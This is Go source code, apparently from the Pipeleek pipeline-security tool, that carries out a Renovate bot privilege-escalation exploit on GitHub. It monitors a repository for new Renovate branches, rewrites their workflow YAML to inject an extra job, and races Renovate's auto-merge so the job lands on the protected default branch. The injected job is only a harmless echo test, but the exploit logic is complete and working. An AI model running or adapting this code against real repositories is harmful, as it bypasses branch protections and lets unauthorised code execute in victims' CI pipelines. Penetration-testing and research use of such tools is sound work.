package renovate

import (
	"context"
	"fmt"
	"regexp"
	"strings"
	"time"

	"github.com/google/go-github/v69/github"
	"github.com/rs/zerolog/log"
	"gopkg.in/yaml.v3"
)

// RunExploit performs the Renovate privilege escalation exploit on GitHub.
func RunExploit(client *github.Client, repoName, renovateBranchesRegex string) {
	ctx := context.Background()

	log.Info().Msg("Ensure the Renovate bot has greater write access than you, otherwise this will not work, and is able to auto merge into the protected main branch")

	parts := strings.Split(repoName, "/")
	if len(parts) != 2 {
		log.Fatal().Str("repoName", repoName).Msg("Repository name must be in format owner/repo")
	}
	owner, repo := parts[0], parts[1]

	repository, _, err := client.Repositories.Get(ctx, owner, repo)
	if err != nil {
		log.Fatal().Stack().Err(err).Str("repoName", repoName).Msg("Unable to retrieve repository information")
	}

	regex, err := regexp.Compile(renovateBranchesRegex)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("The provided renovate-branches-regex is invalid")
	}

	// Check if GitHub Actions are enabled
	if repository.GetDisabled() || repository.GetArchived() {
		log.Fatal().Msg("Repository is disabled or archived, GitHub Actions cannot run")
	}

	// Fetch workflow files to verify they exist
	workflowYml := fetchWorkflowFiles(ctx, client, owner, repo)
	if workflowYml == "" {
		log.Fatal().Msg("No GitHub Actions workflows found, auto merging is impossible")
	}

	checkDefaultBranchProtections(ctx, client, repository)

	log.Info().Msg("Monitoring for new Renovate Bot branches to exploit")
	branch := monitorBranches(ctx, client, repository, regex)

	log.Info().Str("branch", branch.GetName()).Msg("Fetching workflow from Renovate branch")
	workflowContent := getBranchWorkflow(ctx, client, repository, branch)

	log.Info().Str("branch", branch.GetName()).Msg("Modifying workflow configuration")
	workflowContent["pipeleek-renovate-privesc"] = map[string]interface{}{
		"runs-on": "ubuntu-latest",
		"steps": []map[string]interface{}{
			{
				"name": "Pipeleek Renovate Privilege Escalation Test",
				"run":  "echo 'This is a test job for Pipeleek Renovate Privilege Escalation exploit'",
			},
		},
	}

	updateWorkflowYml(ctx, client, repository, branch, workflowContent)

	log.Info().Str("branch", branch.GetName()).Msg("Workflow configuration updated, check if we won the race!")
	log.Info().Msg("If Renovate automatically merges the branch, you have successfully exploited the privilege escalation vulnerability and injected a job into the workflow that runs on the default branch")
	listBranchPRs(ctx, client, repository, branch)
}

func checkDefaultBranchProtections(ctx context.Context, client *github.Client, repo *github.Repository) {
	owner := repo.GetOwner().GetLogin()
	repoName := repo.GetName()
	defaultBranch := repo.GetDefaultBranch()

	protection, resp, err := client.Repositories.GetBranchProtection(ctx, owner, repoName, defaultBranch)
	if err != nil {
		if resp != nil && resp.StatusCode == 404 {
			log.Warn().Str("branch", defaultBranch).Msg("Default branch is not protected, you might have direct push access")
			return
		}
		log.Error().Err(err).Msg("Failed to check if the default branch is protected")
		return
	}

	if protection.GetRequiredPullRequestReviews() == nil && protection.GetRequireLinearHistory() == nil {
		log.Warn().Str("branch", defaultBranch).Msg("Default branch has minimal protections, you might already have direct access")
	} else {
		log.Info().Str("branch", defaultBranch).Msg("Default branch is protected, proceeding with exploit")
	}
}

func monitorBranches(ctx context.Context, client *github.Client, repo *github.Repository, regex *regexp.Regexp) *github.Branch {
	owner := repo.GetOwner().GetLogin()
	repoName := repo.GetName()

	originalBranches := make(map[string]bool)

	for {
		log.Debug().Msg("Checking for new branches created by Renovate Bot")

		branches, _, err := client.Repositories.ListBranches(ctx, owner, repoName, &github.BranchListOptions{
			ListOptions: github.ListOptions{
				PerPage: 100,
			},
		})

		if err != nil {
			log.Error().Err(err).Msg("Failed to list branches, retrying ...")
			time.Sleep(5 * time.Second)
			continue
		}

		if len(originalBranches) == 0 {
			log.Debug().Msg("Storing original branches for comparison")
			for _, b := range branches {
				originalBranches[b.GetName()] = true
			}

			if len(originalBranches) == 100 {
				log.Warn().Msg("More than 100 branches found, new branches might not be detected")
			}
		}

		for _, branch := range branches {
			if _, exists := originalBranches[branch.GetName()]; exists {
				continue
			}

			log.Info().Str("branch", branch.GetName()).Msg("Checking if new branch matches Renovate Bot regex")
			if regex.MatchString(branch.GetName()) {
				log.Info().Str("branch", branch.GetName()).Msg("Identified Renovate Bot branch, starting exploit process")
				return branch
			}
		}

		time.Sleep(10 * time.Second)
	}
}

func fetchWorkflowFiles(ctx context.Context, client *github.Client, owner, repo string) string {
	_, dirContents, _, err := client.Repositories.GetContents(ctx, owner, repo, ".github/workflows", nil)
	if err != nil {
		return ""
	}

	var allWorkflows strings.Builder
	for _, content := range dirContents {
		if content.GetType() == "file" && (strings.HasSuffix(content.GetName(), ".yml") || strings.HasSuffix(content.GetName(), ".yaml")) {
			fileContent, _, _, err := client.Repositories.GetContents(ctx, owner, repo, content.GetPath(), nil)
			if err != nil {
				continue
			}

			if fileContent != nil {
				contentStr, err := fileContent.GetContent()
				if err != nil {
					log.Debug().Err(err).Str("file", content.GetPath()).Msg("Failed to get workflow file content")
					continue
				}
				if contentStr != "" {
					allWorkflows.WriteString(contentStr)
					allWorkflows.WriteString("\n")
				}
			}
		}
	}

	return allWorkflows.String()
}

func getBranchWorkflow(ctx context.Context, client *github.Client, repo *github.Repository, branch *github.Branch) map[string]interface{} {
	owner := repo.GetOwner().GetLogin()
	repoName := repo.GetName()
	branchName := branch.GetName()

	log.Info().Str("branch", branchName).Msg("Fetching workflow files from Renovate branch")

	// Try to find the main workflow file
	workflowPaths := []string{
		".github/workflows/renovate.yml",
		".github/workflows/renovate.yaml",
		".github/workflows/main.yml",
		".github/workflows/main.yaml",
		".github/workflows/ci.yml",
		".github/workflows/ci.yaml",
	}

	var workflowContent string
	var workflowPath string

	// Try each workflow path
	for _, path := range workflowPaths {
		fileContent, _, _, err := client.Repositories.GetContents(ctx, owner, repoName, path, &github.RepositoryContentGetOptions{
			Ref: branchName,
		})
		if err == nil && fileContent != nil {
			content, err := fileContent.GetContent()
			if err == nil && content != "" {
				workflowContent = content
				workflowPath = path
				break
			}
		}
	}

	// If no specific workflow found, try to list all workflows in the branch
	if workflowContent == "" {
		_, dirContents, _, err := client.Repositories.GetContents(ctx, owner, repoName, ".github/workflows", &github.RepositoryContentGetOptions{
			Ref: branchName,
		})
		if err == nil && len(dirContents) > 0 {
			// Use the first workflow file found
			for _, content := range dirContents {
				if content.GetType() == "file" {
					fileContent, _, _, err := client.Repositories.GetContents(ctx, owner, repoName, content.GetPath(), &github.RepositoryContentGetOptions{
						Ref: branchName,
					})
					if err == nil && fileContent != nil {
						wfContent, err := fileContent.GetContent()
						if err == nil && wfContent != "" {
							workflowContent = wfContent
							workflowPath = content.GetPath()
							break
						}
					}
				}
			}
		}
	}

	if workflowContent == "" {
		log.Fatal().Str("branch", branchName).Msg("Failed to retrieve any workflow file from Renovate branch")
	}

	var workflowConfig map[string]interface{}
	err := yaml.Unmarshal([]byte(workflowContent), &workflowConfig)
	if err != nil {
		log.Fatal().Str("workflow", workflowPath).Err(err).Msg("Failed to unmarshal workflow configuration of the Renovate branch")
	}

	// Store the workflow path for later use
	workflowConfig["_pipeleek_workflow_path"] = workflowPath

	return workflowConfig
}

func updateWorkflowYml(ctx context.Context, client *github.Client, repo *github.Repository, branch *github.Branch, workflowConfig map[string]interface{}) {
	owner := repo.GetOwner().GetLogin()
	repoName := repo.GetName()
	branchName := branch.GetName()

	// Extract the workflow path we stored earlier
	workflowPath, ok := workflowConfig["_pipeleek_workflow_path"].(string)
	if !ok {
		workflowPath = ".github/workflows/renovate.yml"
	}
	delete(workflowConfig, "_pipeleek_workflow_path")

	log.Info().Str("branch", branchName).Str("file", workflowPath).Msg("Modifying workflow file in Renovate branch")

	workflowYaml, err := yaml.Marshal(workflowConfig)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed to marshal workflow configuration for the Renovate branch")
	}

	// Get current file to get its SHA
	fileContent, _, _, err := client.Repositories.GetContents(ctx, owner, repoName, workflowPath, &github.RepositoryContentGetOptions{
		Ref: branchName,
	})
	if err != nil {
		log.Fatal().Stack().Err(err).Str("branch", branchName).Msg("Failed to get current workflow file")
	}

	opts := &github.RepositoryContentFileOptions{
		Message: github.Ptr("Update workflow for Pipeleek Renovate Privilege Escalation exploit"),
		Content: workflowYaml,
		Branch:  github.Ptr(branchName),
		SHA:     fileContent.SHA,
	}

	_, _, err = client.Repositories.UpdateFile(ctx, owner, repoName, workflowPath, opts)
	if err != nil {
		log.Fatal().Stack().Err(err).Str("branch", branchName).Msg("Failed to update workflow file in Renovate branch")
	}

	log.Info().Str("branch", branchName).Str("file", workflowPath).Msg("Updated remote workflow file in Renovate branch")
}

func listBranchPRs(ctx context.Context, client *github.Client, repo *github.Repository, branch *github.Branch) {
	owner := repo.GetOwner().GetLogin()
	repoName := repo.GetName()
	branchName := branch.GetName()

	opts := &github.PullRequestListOptions{
		Head: fmt.Sprintf("%s:%s", owner, branchName),
		Base: repo.GetDefaultBranch(),
	}

	prs, _, err := client.PullRequests.List(ctx, owner, repoName, opts)
	if err != nil {
		log.Error().Err(err).Msg("Failed to list pull requests for branch, go check manually")
		return
	}

	if len(prs) == 0 {
		log.Info().Str("branch", branchName).Msg("No pull requests found yet for this branch")
		return
	}

	for _, pr := range prs {
		log.Info().Str("pr", pr.GetTitle()).Str("url", pr.GetHTMLURL()).Msg("Found pull request for targeted branch")
	}
}
